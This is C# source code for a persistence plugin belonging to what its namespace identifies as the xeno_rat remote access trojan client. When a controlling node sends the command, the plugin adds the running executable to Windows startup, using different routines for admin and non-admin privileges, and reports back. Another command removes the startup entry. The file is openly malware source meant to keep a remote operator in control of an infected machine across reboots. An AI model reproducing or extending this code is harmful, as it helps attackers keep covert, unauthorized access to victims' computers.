using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using xeno_rat_client;


namespace Plugin
{
    public class Main
    {
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            string executablePath = System.Reflection.Assembly.GetEntryAssembly().Location;
            byte[] data = await node.ReceiveAsync();
            if (data == null || data.Length != 1)
            {
                node.Disconnect();
                return;
            }
            else if (data[0] == 0)
            {
                if (Utils.IsAdmin())
                {
                    if (await Utils.AddToStartupAdmin(executablePath))
                    {
                        await node.SendAsync(new byte[] { 1 });
                    }
                    else
                    {
                        await node.SendAsync(new byte[] { 0 });
                    }
                }
                else
                {
                    if (await Utils.AddToStartupNonAdmin(executablePath))
                    {
                        await node.SendAsync(new byte[] { 1 });
                    }
                    else
                    {
                        await node.SendAsync(new byte[] { 0 });
                    }
                }
            }
            else if (data[0] == 1) 
            {
                await Utils.RemoveStartup(executablePath);
            }
            await Task.Delay(1000);
        }
    }
}
